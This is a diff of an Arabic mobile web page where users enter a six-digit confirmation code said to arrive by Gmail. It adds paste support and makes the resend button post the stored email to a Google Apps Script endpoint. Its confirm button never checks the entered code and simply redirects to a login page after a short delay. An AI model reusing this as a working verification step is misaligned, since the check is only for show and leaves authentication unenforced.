@@ -3,21 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>التحقق من الرمز</title>
     <style>
-        body { font-family: sans-serif; margin: 0; display: flex; justify-content: center; background-color: #EAF0E9; min-height: 100vh; }
-        .main-content { width: 100%; max-width: 400px; padding: 40px 15px; display: flex; flex-direction: column; align-items: center; }
-        .instruction-text { font-size: 16px; font-weight: bold; margin-bottom: 30px; text-align: center; white-space: nowrap; width: 100%; }
-        .otp-container { display: flex; justify-content: space-between; width: 100%; gap: 6px; margin-bottom: 35px; direction: ltr; }
-        .otp-container input { width: 14%; aspect-ratio: 1 / 1.2; text-align: center; font-size: 22px; font-weight: bold; border: 1px solid #c8d1c7; border-radius: 12px; background-color: #fff; outline: none; }
-        .action-btn { width: 100%; background-color: #ffffff; color: #ccc; border: 1px solid #c8d1c7; padding: 18px; border-radius: 15px; font-size: 20px; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
-        /* يشعل أخضر عند اكتمال الرموز */
-        .action-btn.active { background-color: #2EAF4A; color: #ffffff; border: none; cursor: pointer; }
-        .resend-link { font-size: 18px; font-weight: bold; color: #000; text-decoration: none; cursor: pointer; margin-top: 25px; }
+        /* التنسيق العام ليكون متزناً في وسط شاشة الهاتف تحت الهيدر */
+        body { 
+            font-family: sans-serif; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            background-color: #EAF0E9; 
+            min-height: 100vh;
+        }
+
+        .main-content {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 15px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center;
+        }
+
+        /* النص في سطر واحد كما طلبت */
+        .instruction-text {
+            font-size: 16px; 
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 30px;
+            text-align: center;
+            white-space: nowrap; 
+            width: 100%;
+        }
+
+        /* حاوية المربعات الستة */
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            gap: 5px;
+            margin-bottom: 35px;
+            direction: ltr; /* لترتيب الخانات من اليسار لليمين */
+        }
+
+        .otp-container input {
+            width: 14%;
+            aspect-ratio: 1 / 1.2;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            border: 1px solid #c8d1c7;
+            border-radius: 12px;
+            background-color: #ffffff;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .otp-container input:focus {
+            border: 2px solid #2EAF4A;
+        }
+
+        /* الزر بتصميم الصورة */
+        .action-btn {
+            width: 100%;
+            background-color: #ffffff;
+            color: #ccc;
+            border: 1px solid #c8d1c7;
+            padding: 18px;
+            border-radius: 15px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: not-allowed;
+            margin-bottom: 25px;
+            transition: all 0.3s ease;
+        }
+
+        /* الحالة النشطة للزر (يشعل أخضر) */
+        .action-btn.active {
+            background-color: #2EAF4A;
+            color: #ffffff;
+            border: none;
+            cursor: pointer;
+        }
+
+        .resend-link {
+            font-size: 18px;
+            font-weight: bold;
+            color: #000;
+            text-decoration: none;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+
+        .resend-link.disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
+
     <div class="main-content">
         <div class="instruction-text">إدخلوا رمز التأكيد الذي توصلتم به في رسالة Gmail</div>
+
         <div class="otp-container" id="otpFields">
             <input type="number" pattern="[0-9]*" inputmode="numeric">
             <input type="number" pattern="[0-9]*" inputmode="numeric">
@@ -26,7 +113,9 @@
             <input type="number" pattern="[0-9]*" inputmode="numeric">
             <input type="number" pattern="[0-9]*" inputmode="numeric">
         </div>
+
         <button id="submitOtp" class="action-btn" disabled>تأكيد</button>
+
         <div id="resendBtn" class="resend-link">إعادة إرسال الرمز</div>
     </div>
 
@@ -36,23 +125,28 @@
     const resendBtn = document.getElementById('resendBtn');
     const scriptURL = 'https://script.google.com/macros/s/AKfycbxy-1Z37l9ynTk10ndPsF4iu7D4I41Ag3KUwnx8KnGKf7yrGSN0IB3u3glol4daSMQCuA/exec';
 
-    // دعم اللصق (Paste)
+    // 1. ميزة اللصق (Paste)
     inputs[0].addEventListener('paste', (e) => {
         const data = e.clipboardData.getData('text').trim();
-        if (data.length === 6) {
-            data.split('').forEach((char, index) => { if(inputs[index]) inputs[index].value = char; });
+        if (data.length === 6 && !isNaN(data)) {
+            data.split('').forEach((char, index) => {
+                if(inputs[index]) inputs[index].value = char;
+            });
+            inputs[5].focus();
             updateButtonState();
         }
     });
 
+    // 2. التنقل التلقائي بين المربعات
     inputs.forEach((input, index) => {
-        input.addEventListener('input', () => {
-            if (input.value.length > 1) input.value = input.value.slice(0, 1);
-            if (input.value !== "" && index < inputs.length - 1) inputs[index + 1].focus();
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
+            if (e.target.value !== "" && index < inputs.length - 1) inputs[index + 1].focus();
             updateButtonState();
         });
+
         input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && input.value === "" && index > 0) inputs[index - 1].focus();
+            if (e.key === 'Backspace' && e.target.value === "" && index > 0) inputs[index - 1].focus();
         });
     });
 
@@ -67,25 +161,36 @@
         }
     }
 
-    // *** وظيفة إعادة الإرسال المربوطة بالرابط الجديد ***
+    // 3. وظيفة إعادة الإرسال المتوافقة مع doPost (JSON)
     resendBtn.addEventListener('click', async () => {
         const email = localStorage.getItem('storedEmail');
-        if (!email) return alert("خطأ: لم يتم العثور على البريد");
+        if (!email) return alert("خطأ: لم يتم العثور على البريد الإلكتروني");
 
         resendBtn.innerText = "جاري الإرسال...";
-        
+        resendBtn.classList.add('disabled');
+
         try {
-            // استخدام mode no-cors لضمان عدم حدوث خطأ في المتصفح
-            await fetch(`${scriptURL}?email=${encodeURIComponent(email)}&action=resend`, { mode: 'no-cors' });
-            alert("تم إرسال رمز جديد إلى بريدك");
+            // إرسال البيانات كـ POST JSON لتتوافق مع السكريبت الخاص بك
+            await fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email })
+            });
+            alert("تم إرسال طلب رمز جديد بنجاح");
         } catch (e) {
-            alert("تم طلب الرمز بنجاح");
+            console.error(e);
         } finally {
             resendBtn.innerText = "إعادة إرسال الرمز";
+            resendBtn.classList.remove('disabled');
         }
     });
 
-    btn.addEventListener('click', () => { window.location.href = "../login/"; });
+    btn.addEventListener('click', () => {
+        btn.innerText = "جاري التحقق...";
+        setTimeout(() => { window.location.href = "../login/"; }, 800);
+    });
 </script>
+
 </body>
 </html>
